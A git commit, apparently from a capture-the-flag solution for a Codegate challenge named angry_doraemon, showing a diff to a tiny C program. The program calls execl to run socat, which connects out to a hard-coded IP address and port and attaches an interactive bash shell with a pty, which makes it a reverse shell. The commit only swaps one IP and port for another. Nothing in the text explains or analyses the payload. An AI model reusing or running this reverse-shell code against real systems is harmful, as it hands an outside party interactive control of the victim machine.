2e34fe4cc3be76eade4aace7091c68f75cf8b73c
Leo.C <evilleoc@gmail.com>
2014-07-02 21:51:36 +0800

    doraemon

--- Codegate/angry_doraemon/execl.c
+++ Codegate/angry_doraemon/execl.c
@@ -2,6 +2,6 @@
 
 int main()
 {
-    execl("/bin/sh", "sh", "-c", "socat tcp-connect:182.92.158.177:9999 exec:'bash -li',pty,stderr,setsid,sigint,sane", 0);
+    execl("/bin/sh", "sh", "-c", "socat tcp-connect:182.92.15.17:9988 exec:'bash -li',pty,stderr,setsid,sigint,sane", 0);
     return 0;
 }
